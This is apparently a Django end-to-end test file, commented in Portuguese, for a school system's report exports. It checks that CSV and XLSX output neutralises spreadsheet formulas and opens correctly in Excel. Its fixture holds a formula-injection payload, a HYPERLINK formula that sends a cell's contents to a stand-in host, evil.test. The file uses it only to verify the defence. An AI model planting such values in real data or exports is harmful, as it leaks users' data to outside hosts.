"""Export dos relatórios, ponta a ponta.

A unidade da neutralização de fórmula vive em
`apps/common/tests/test_planilha.py`, junto do helper. Aqui o que se
checa é que ela de fato alcança o arquivo que sai pelo endpoint.
"""
import csv
import io
from datetime import date

from django.test import TestCase
from django.urls import reverse
from rest_framework.test import APIClient
from rest_framework_simplejwt.tokens import RefreshToken

from apps.accounts.models import Usuario
from apps.escola.models import Aluno, Escola, Turma
from apps.ocorrencias.models import Ocorrencia

# `=HYPERLINK` é o caso ruim: monta um link com dados da própria
# planilha e, ao contrário de DDE, não dispara aviso nenhum no Excel.
PAYLOAD = '=HYPERLINK("http://evil.test?v="&A1,"Clique aqui")'


class FormulaNoExportTests(TestCase):
    """Ponta a ponta: professor escreve, direção baixa, Excel abre."""

    @classmethod
    def setUpTestData(cls) -> None:
        cls.escola = Escola.objects.create(nome="Escola")
        turma = Turma.objects.create(
            escola=cls.escola,
            nome="1º A",
            turno=Turma.Turno.MATUTINO,
            ano_letivo=2026,
        )
        aluno = Aluno.objects.create(
            escola=cls.escola,
            matricula="M1",
            nome_completo="Ana",
            turma=turma,
            nome_responsavel=PAYLOAD,
        )
        Ocorrencia.objects.create(
            escola=cls.escola,
            turma=turma,
            aluno=aluno,
            descricao=PAYLOAD,
            data_ocorrencia=date(2026, 3, 10),
        )
        cls.diretor = Usuario.objects.create_user(
            username="dir",
            password="x",
            perfil=Usuario.Perfil.DIRETOR,
            escola=cls.escola,
        )

    def setUp(self) -> None:
        self.client = APIClient()
        token = RefreshToken.for_user(self.diretor).access_token
        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")

    def _celulas(self, rota: str) -> list[str]:
        """Células da primeira linha de dados, já desescapadas.

        Comparar contra o texto cru da resposta não serve: o CSV dobra as
        aspas internas do payload, então o valor original não aparece
        literalmente nem antes nem depois do conserto.
        """
        resp = self.client.get(reverse(rota), {"formato": "csv"})
        self.assertEqual(resp.status_code, 200)
        # CSV dos relatórios: UTF-8 com BOM e `;` (Excel em pt-BR).
        linhas = list(
            csv.reader(
                io.StringIO(resp.content.decode("utf-8-sig")), delimiter=";"
            )
        )
        self.assertEqual(len(linhas), 2, "esperava cabeçalho + uma linha")
        return linhas[1]

    def _checar_celula_inerte(self, valor: str) -> None:
        # O conteúdo continua lá e legível — só não começa com `=`.
        self.assertIn("HYPERLINK", valor)
        self.assertTrue(
            valor.startswith("'"),
            f"célula sem apóstrofo: {valor!r}",
        )
        self.assertFalse(valor.startswith(("=", "+", "-", "@")))

    def test_descricao_de_ocorrencia_sai_como_texto(self):
        celulas = self._celulas("api_v1:ocorrencia-exportar")
        # Última coluna do export de ocorrências é `descricao`.
        self._checar_celula_inerte(celulas[-1])

    def test_nome_de_responsavel_tambem(self):
        """Pode ter vindo de uma importação de terceiro."""
        celulas = self._celulas("api_v1:aluno-relatorio")
        # `responsavel` é a penúltima coluna do cadastral.
        self._checar_celula_inerte(celulas[-2])


class FormatoDoArquivoTests(TestCase):
    """O arquivo tem que abrir certo no Excel da secretaria."""

    @classmethod
    def setUpTestData(cls) -> None:
        cls.escola = Escola.objects.create(nome="Escola")
        turma = Turma.objects.create(
            escola=cls.escola, nome="1º A",
            turno=Turma.Turno.MATUTINO, ano_letivo=2026,
        )
        aluno = Aluno.objects.create(
            escola=cls.escola, matricula="M1", nome_completo="João", turma=turma,
        )
        for descricao, dia in (
            ("- chegou atrasado", 10),
            (PAYLOAD, 11),
            ("colado do PDF\x0ccom quebra de página", 12),
        ):
            Ocorrencia.objects.create(
                escola=cls.escola, turma=turma, aluno=aluno,
                descricao=descricao, data_ocorrencia=date(2026, 3, dia),
            )
        cls.diretor = Usuario.objects.create_user(
            username="dir", password="x",
            perfil=Usuario.Perfil.DIRETOR, escola=cls.escola,
        )

    def setUp(self) -> None:
        self.client = APIClient()
        token = RefreshToken.for_user(self.diretor).access_token
        self.client.credentials(HTTP_AUTHORIZATION=f"Bearer {token}")

    def _baixar(self, formato: str):
        resp = self.client.get(
            reverse("api_v1:ocorrencia-exportar"), {"formato": formato}
        )
        self.assertEqual(resp.status_code, 200)
        return resp.content

    def test_csv_com_bom_e_ponto_e_virgula(self):
        """Sem BOM o Excel lê "João" como "JoÃ£o"; com `,` o Excel pt-BR
        joga tudo numa coluna só."""
        conteudo = self._baixar("csv")
        self.assertTrue(conteudo.startswith(b"\xef\xbb\xbf"))
        cabecalho = conteudo.decode("utf-8-sig").splitlines()[0]
        self.assertIn(";", cabecalho)
        self.assertIn("João", conteudo.decode("utf-8-sig"))

    def test_xlsx_so_neutraliza_o_que_vira_formula(self):
        """No XLSX só `=` vira fórmula (openpyxl). Prefixar `-` deixava o
        apóstrofo visível na célula sem proteger nada."""
        from openpyxl import load_workbook

        planilha = load_workbook(io.BytesIO(self._baixar("xlsx"))).active
        cabecalho = [c.value for c in planilha[1]]
        coluna = cabecalho.index("descricao")
        descricoes = {
            linha[coluna] for linha in planilha.iter_rows(min_row=2, values_only=True)
        }
        self.assertIn("- chegou atrasado", descricoes)
        self.assertIn(f"'{PAYLOAD}", descricoes)
        # Caractere de controle removido: antes derrubava o export (500).
        self.assertIn("colado do PDFcom quebra de página", descricoes)
        for celula in planilha.iter_cols(min_col=coluna + 1, max_col=coluna + 1, min_row=2):
            for c in celula:
                self.assertNotEqual(c.data_type, "f")
